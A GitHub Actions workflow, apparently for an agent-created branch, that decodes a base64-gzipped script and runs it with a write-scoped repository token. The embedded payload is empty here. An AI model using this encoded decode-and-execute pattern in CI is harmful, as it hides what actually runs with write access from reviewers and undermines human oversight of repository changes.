name: PR31 OpenCode RLM differential publication v2

on:
  push:
    branches:
      - agent/pr31-opencode-rlm-verify-a6f1
    paths:
      - .github/workflows/pr31-opencode-rlm-differential-publish-v2.yml

permissions:
  contents: write
  pull-requests: read
  actions: read

concurrency:
  group: pr31-opencode-rlm-differential-publication-v2
  cancel-in-progress: false

jobs:
  verify-build-rust-publish:
    runs-on: ubuntu-22.04
    timeout-minutes: 150
    steps:
      - name: Checkout locked staged integration
        uses: actions/checkout@v5
        with:
          ref: e0c11422a5d038231cdfa73bf3f48dffc7554f51
          fetch-depth: 0

      - name: Set up Node 22
        uses: actions/setup-node@v5
        with:
          node-version: 22
          cache: npm
          cache-dependency-path: package-lock.json

      - name: Run differential, build, Rust, security, and normal publication
        env:
          GH_TOKEN: ${{ github.token }}
        shell: bash
        run: |
          python - <<'PY'
          import base64
          import gzip
          import pathlib

          payload = ''''''
          target = pathlib.Path('${{ runner.temp }}/pr31_publish_v2.sh')
          target.write_bytes(gzip.decompress(base64.b64decode(payload)))
          PY
          chmod +x '${{ runner.temp }}/pr31_publish_v2.sh'
          bash '${{ runner.temp }}/pr31_publish_v2.sh'

      - name: Upload final differential and publication evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: pr31-opencode-rlm-differential-publication-v2
          path: ${{ runner.temp }}/pr31-final-evidence
          if-no-files-found: warn
          retention-days: 14
